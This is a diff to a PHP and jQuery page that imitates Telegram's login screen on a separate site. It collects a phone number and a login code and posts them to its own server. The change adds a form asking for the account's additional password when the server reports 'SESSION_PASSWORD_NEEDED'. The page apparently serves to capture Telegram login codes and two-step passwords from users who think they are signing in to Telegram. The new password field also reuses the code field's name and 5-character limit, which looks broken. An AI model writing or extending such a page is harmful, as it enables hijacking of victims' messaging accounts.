@@ -638,8 +638,6 @@ array(
 "ZW" => "Zimbabwe"
 );
 ?>
- 
-
 <center><h3><?php echo $message; ?></h3></center>
 <div class="container mobile_number_form" style="width:50%;">
     <div class="row" style="margin: 53px;">
@@ -654,12 +652,17 @@ array(
             <!-- country -->
              <div class="input-field input-select"> 
                 <div class="input-field-input">
-            <select class="opts  dropdown-toggle"> 
+            <select class="opts dropdown-toggle"> 
               <?php
-           
             foreach( $countries as $country_kye => $country_namehw) {
+
+                $selected = '';
+                if($country_name == $country_namehw)
+                {
+                    $selected = 'selected="selected"';
+                }
                
-                    echo '<option value="' . $country_namehw . '">' . $country_namehw . '</option>';
+                    echo '<option value="' . $country_kye . '" '.$selected.'>' . $country_namehw . '</option>';
               
             }
 ?>
@@ -725,25 +728,51 @@ array(
                     </span>
                 </p>
             </div>
-        <div class="form-outline d-flex align-items-center justify-content-center mb-4">
+            <div class="form-outline d-flex align-items-center justify-content-center mb-4">
+                
             
-        
-        
-            <input type="text" name="otp" id="otp" maxlength="5" class="form-control" placeholder="code"/>
+            
+                <input type="text" name="otp" id="otp" maxlength="5" class="form-control" placeholder="code"/>
 
-        </div>
-        
-    
+            </div>
 
-        <!-- Checkbox -->
-        
-
-        <!-- Submit button -->
-        <button type="Sumbit" style="visibility:hidden;" name="otp_save" id="otp_save" class="btn btn-primary btn-block mb-4">Sumbit</button>
+            <div class="d-flex align-items-center justify-content-center" style="display: flex;justify-content: center;">
+                <button type="Sumbit" name="resend_button" id="resend_button" class="btn btn-default mb-4">Resend</button>
+            </div>
+            <button type="Sumbit" style="visibility:hidden;" name="otp_save" id="otp_save" class="btn btn-primary btn-block mb-4">Sumbit</button>
         </div>
     </form>
 </div>
+
+
+<!-- password form -->
+<div class="container password_form" style="width:30%;display:none;">
+    <form method="post">
+        <input type="hidden" name="mobile_number_hidden_password_form" id="mobile_number_hidden_password_form" class="form-control"/>
+        <!-- Email input -->
+        <div class="row">
+        <div style="justify-content: center;display: flex;"><img style="width: 40%;" src="<?php echo Site_URL ?>/custom_telegram_form/img/telegram.png"></div>
+            <div class="phone-wrapper mb-4">
+                <h4 class="phone">Enter Your Password</h4>
+                <span class="phone-edit tgico-edit"></span>
+                <p class="subtitle sent-type">
+                    <span class="i18n">
+                    Your account is protected with
+                    <br>
+                    an additional password
+                    </span>
+                </p>
+            </div>
+            <div class="form-outline d-flex align-items-center justify-content-center mb-4">
+                <input type="text" name="otp" id="otp" maxlength="5" class="form-control" placeholder="code"/>
+            </div>
+            <button type="Sumbit" style="visibility:hidden;" name="otp_save" id="otp_save" class="btn btn-primary btn-block mb-4">Sumbit</button>
+        </div>
+    </form>
+</div>
+
 <br>
+
 
 </body>
 </html>
@@ -761,6 +790,14 @@ array(
 }
 </style>
 <script>
+
+jQuery(document).ready(function(){
+    jQuery("#resend_button").on("click",function(){
+        window.location.href = window.location.href;
+        // jQuery(".otp_form").attr("style","width:30%;display:none;");
+    });
+});
+
     function countdown4() {
         var seconds = 60;
         //var seconds = 900;
@@ -820,9 +857,18 @@ array(
                     }
                     else if(value_hwe != '')
                     {
-                        alert("Invalid Code");
-                        jQuery("#loader_icon").attr("style","display:none;");
-                        jQuery(".otp_form").attr("style","width:30%;display:block;");
+                        if(value_hwe == "SESSION_PASSWORD_NEEDED")
+                        {
+                            jQuery("#loader_icon").attr("style","display:none;");
+                            jQuery(".password_form").attr("style","width:30%;display:block;");
+                        }
+                        else
+                        {
+                            alert("Invalid Code");
+                            jQuery("#loader_icon").attr("style","display:none;");
+                            jQuery(".otp_form").attr("style","width:30%;display:block;");
+                        }
+                       
                     }
                 }
             });
@@ -851,6 +897,7 @@ array(
                     data: { "save_code_custom_form":"save_code_custom_form" ,"mobile_number":mobile_number,"country_code" :country_code,"otp_code":value},
                     success:function(result)
                     {
+                        
                         if(result == 1)
                         {
                             
